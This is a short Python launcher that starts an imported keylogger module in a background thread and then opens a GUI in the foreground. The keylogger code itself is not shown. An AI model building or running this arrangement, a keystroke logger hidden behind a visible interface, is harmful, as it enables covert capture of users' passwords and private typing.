import threading
import codes.GUI as GUI
import codes.KeyLogger as Logger


# this class run a thread activate key logger :
class LoggerThread(threading.Thread):
    def __init__(self):
        super().__init__()

    def run(self):
        Logger.start()


def main():
    loggerThread = LoggerThread()
    loggerThread.start()

    GUI.start()


if __name__ == '__main__':
    main()
